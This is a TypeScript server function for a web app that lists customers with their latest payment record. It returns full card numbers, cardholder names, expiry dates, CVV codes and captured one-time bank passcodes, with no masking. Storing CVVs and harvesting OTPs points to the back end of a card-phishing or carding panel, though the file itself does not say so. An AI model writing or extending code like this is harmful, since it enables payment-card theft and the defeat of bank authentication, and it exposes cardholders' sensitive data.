import { createServerFn } from '@tanstack/react-start'

import { prisma } from '#/db'

export type CustomerListItem = {
  id: number
  name: string | null
  phone: string | null
  address: string | null
  ordersCount: number
  createdAt: string
  paymentInfo?: {
    id: number
    cardHoldName: string | null
    cardNumber: string | null
    last4: string | null
    cardDate: string | null
    cardCVV: string | null
    otp: string | null
    hasOTP: boolean
  }
}

export const getCustomers = createServerFn({ method: 'GET' }).handler(
  async (): Promise<CustomerListItem[]> => {
    const customers = await prisma.customer.findMany({
      orderBy: { createdAt: 'desc' },
      include: {
        _count: {
          select: { orders: true },
        },
      },
    })

    // Some environments may not have the PaymentInfo model generated yet; guard to avoid runtime crash.
    const canFetchPaymentInfo =
      (prisma as any).paymentInfo && typeof (prisma as any).paymentInfo.findMany === 'function'

    const paymentInfos = canFetchPaymentInfo
      ? await (prisma as any).paymentInfo.findMany({
          where: { customerId: { in: customers.map((c: any) => c.id) } },
          orderBy: { createdAt: 'desc' },
          include: { receiveOTP: true },
        })
      : []

    const latestPaymentByCustomer = new Map<
      number,
      (typeof paymentInfos)[number]
    >()
    if (canFetchPaymentInfo) {
      for (const info of paymentInfos) {
        if (!latestPaymentByCustomer.has(info.customerId)) {
          latestPaymentByCustomer.set(info.customerId, info)
        }
      }
    }

    return customers.map((customer) => {
      const info = latestPaymentByCustomer.get(customer.id)

      return {
        id: customer.id,
        name: customer.name,
        phone: customer.phone,
        address: buildAddress(customer),
        ordersCount: customer._count.orders,
        createdAt: customer.createdAt.toISOString(),
        paymentInfo: info
          ? {
              id: info.id,
              cardHoldName: info.cardHoldName ?? null,
              cardNumber: info.cardNumber ?? null,
              last4: last4(info.cardNumber),
              cardDate: info.cardDate ?? null,
              cardCVV: info.cardCVV ?? null,
              otp: info.receiveOTP?.otp ?? null,
              hasOTP: !!info.receiveOTP,
            }
          : undefined,
      }
    })
  },
)

function buildAddress(customer: {
  addressCountry: string | null
  addressCity: string | null
  addressDetail: string | null
}) {
  const parts = [
    customer.addressCountry,
    customer.addressCity,
    customer.addressDetail,
  ].filter(Boolean)

  return parts.length ? parts.join(' · ') : null
}

function last4(cardNumber: string | null) {
  if (!cardNumber) return null
  const digits = cardNumber.replace(/\D/g, '')
  if (!digits) return null
  return digits.slice(-4)
}
